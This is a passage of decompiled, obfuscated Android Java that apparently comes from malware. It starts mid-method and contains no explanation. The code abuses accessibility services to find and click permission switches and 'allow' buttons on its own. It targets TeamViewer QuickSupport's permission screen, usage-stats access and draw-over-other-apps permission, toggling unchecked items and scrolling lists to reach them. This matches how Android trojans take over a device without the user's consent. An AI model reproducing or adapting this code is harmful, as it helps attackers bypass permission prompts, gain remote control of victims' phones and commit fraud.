            }

            intV2 = listV1.size();
            if (intV2 == 0)
                return false;

            intV2 = 0;
            intV4 = listV1.size();
            AccessibilityNodeInfo accessibilityNodeInfoV1;
            if (intV4 > 1) {
                Context contextV1 = this.ifdf;
                strV1 = Cgoto.m133super(contextV1);
                p023w p023wV4 = this.f85this;
                AccessibilityNodeInfo accessibilityNodeInfoV4 = p023wV4.m20this();
                accessibilityNodeInfoV1 = fddo.m96return(accessibilityNodeInfoV4, strV11, strV1, strV10);
            } else {
                Object objV1 = listV1.get(intV2);
                accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
            }

            strV2 = Cfor.ifdf;
            boolV2 = strV2.contains(strV3);
            if (boolV2) {
                boolean boolV1 = accessibilityNodeInfoV1.isChecked();
                if (boolV1)
                    return boolV6;
                else
                    return false;
            }

            boolean boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
            if (boolV1)
                return boolV6;
            else return false;
        }

        strV2 = "teamviewer";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            List listV1 = this.m165new(strV5);
            intV2 = listV1.size();
            if (intV2 != intV4) {
                return false;
            }

            p023w p023wV2 = this.f85this;
            AccessibilityNodeInfo accessibilityNodeInfoV2 = p023wV2.m20this();
            if (accessibilityNodeInfoV2 != null) {
                p023wV2 = this.f85this;
                CharSequence charSequenceV2 = p023wV2.getPackageName();
                if (charSequenceV2 != null) {
                    p023wV2 = this.f85this;
                    accessibilityNodeInfoV2 = p023wV2.m20this();
                    charSequenceV2 = accessibilityNodeInfoV2.getPackageName();
                    strV3 = "com.teamviewer.quicksupport.market";
                    boolV2 = strV2.equals(strV3);
                    if (boolV2) {
                        Iterator iteratorV2 = listV1.iterator();
                        while (iteratorV2.hasNext()) {
                            Object objV3 = iteratorV2.next();
                            AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                            String strV4 = this.f49break;
                            boolean boolV4 = this.ifdf(accessibilityNodeInfoV3, strV15, strV4);
                            if (boolV4) {
                                boolV3 = fddo.ifdf(accessibilityNodeInfoV3);
                                if (boolV3)
                                    return boolV6;
                            }
                        }
                    }
                }
            }


            Iterator iteratorV1 = listV1.iterator();
            while (iteratorV1.hasNext()) {
                Object objV2 = iteratorV1.next();
                AccessibilityNodeInfo accessibilityNodeInfov2 = (AccessibilityNodeInfo) objV2;
                strV3 = this.f49break;
                String strV4 = "/permission_enable_allow_button";
                boolV3 = this.ifdf(accessibilityNodeInfov2, strV4, strV3);
                if (boolV3) {
                    boolV2 = fddo.ifdf(accessibilityNodeInfov2);
                    if (boolV2) {
                        return boolV6;
                    }
                }
            }

            return false;
        }

        strV2 = "usage_stats";
        boolV2 = strV1.equals(strV2);
        if (boolV2) {
            Context contextV1 = this.ifdf;
            boolean boolV1 = Cgoto.m139transient(contextV1);
            if (boolV1) {
                return boolV6;
            }

            boolV1 = Cgoto.grethwjrsfhj();
            if (boolV1) {
                List listV1 = this.m165new(strV5);
                List listV2 = this.m165new(strV8);
                int intV3 = listV1.size();
                if (intV3 == intV4) {
                    intV3 = listV2.size();
                    if (intV3 == 1) {
                        intV3 = 0;
                        Object objV2 = listV2.get(intV3);
                        AccessibilityNodeInfo accessibilityNodeInfoV2 = (AccessibilityNodeInfo) objV2;
                        boolean boolV4 = accessibilityNodeInfoV2.isChecked();
                        if (!boolV4) {
                            fddo.ifdf(accessibilityNodeInfoV2);
                        }

                        Object objV1 = listV1.get(intV3);
                        AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                        CharSequence charSequenceV2 = accessibilityNodeInfoV1.getText();
                        strV2 = charSequenceV2.toString();
                        boolV2 = strV2.contains(strV7);
                        if (!boolV2) {
                            boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                            if (boolV1)
                                return boolV6;
                        }

                        return boolV3;
                    }
                }
            }

            List listV1 = this.m165new(strV13);
            intV2 = listV1.size();
            if (intV2 == 0) {
                listV1 = this.m165new(strV8);
            }

            intV2 = listV1.size();
            if (intV2 == 1) {
                intV2 = 0x0;
                Object objV3 = listV1.get(intV2);
                AccessibilityNodeInfo accessibilityNodeInfoV3 = (AccessibilityNodeInfo) objV3;
                boolV2 = accessibilityNodeInfoV3.isChecked();
                if (!boolV2) {
                    boolV2 = fddo.ifdf(accessibilityNodeInfoV3);
                    if (boolV2) {
                        boolV2 = Cgoto.grethwjrsfhj();
                        if (!boolV2)
                            return boolV6;
                    }
                }
            }

            boolV2 = this.m162else();
            if (boolV2) {
                int intV1 = listV1.size();
                if (intV1 != 1) {
                    contextV1 = this.ifdf;
                    strV1 = Cgoto.m133super(contextV1);
                    p023w p023wV2 = this.f85this;
                    AccessibilityNodeInfo accessibilityNodeInfoV2 = p023wV2.m20this();
                    AccessibilityNodeInfo accessibilityNodeInfoV1 = fddo.m96return(accessibilityNodeInfoV2, strV11, strV1, strV10);
                    fddo.ifdf(accessibilityNodeInfoV1);
                    return false;
                }
            }

            strV1 = "widget.RecyclerView";
            listV1 = this.m165new(strV1);
            intV2 = listV1.size();
            if (intV2 > 0) {
                intV2 = 0x0;
                Object objV1 = listV1.get(intV2);
                AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                int intV3 = 0x1000;
                accessibilityNodeInfoV1.performAction(intV3);
                return false;
            }

            return false;
        }

        strV2 = "overlay";
        boolean boolV1 = strV1.equals(strV2);
        if (boolV1) {
            Context contextV1 = this.ifdf;
            boolV1 = Settings.canDrawOverlays(contextV1);
            if (boolV1)
                return boolV6;

            List listV1 = this.m165new(strV13);
            intV2 = listV1.size();
            if (intV2 == 0) {
                listV1 = this.m165new(strV8);
            }

            intV2 = listV1.size();
            if (intV2 == 1) {
                intV2 = 0x0;
                Object objV1 = listV1.get(intV2);
                AccessibilityNodeInfo accessibilityNodeInfoV1 = (AccessibilityNodeInfo) objV1;
                boolV2 = accessibilityNodeInfoV1.isChecked();
                if (!boolV2) {
                    boolV1 = fddo.ifdf(accessibilityNodeInfoV1);
                    if (boolV1)
                        return boolV6;
                }
            }

            boolV1 = this.m162else();
            if (boolV1) {
                p023w p023wV1 = this.f85this;
                AccessibilityNodeInfo accessibilityNodeInfoV1 = p023wV1.m20this();
                Context contextV2 = this.ifdf;
                int intV3 = 0xf;
                strV2 = Cgoto.m137throw(contextV2, intV3);
                accessibilityNodeInfoV1 = fddo.m96return(accessibilityNodeInfoV1, strV11, strV2, strV10);
                fddo.ifdf(accessibilityNodeInfoV1);
                return false;
            }

            int intV1 = 0x0;
            strV2 = "widget.RecyclerView";
            List listV2 = this.m165new(strV2);
            int intV3 = listV2.size();
            if (intV3 > 0) {
                Object objV2 = listV2.get(intV1);
                AccessibilityNodeInfo accessibilityNodeInfoV2 = (AccessibilityNodeInfo) objV2;
                intV3 = 0x1000;
                accessibilityNodeInfoV2.performAction(intV3);
            }

            return false;
        }

        return false;
    }
}
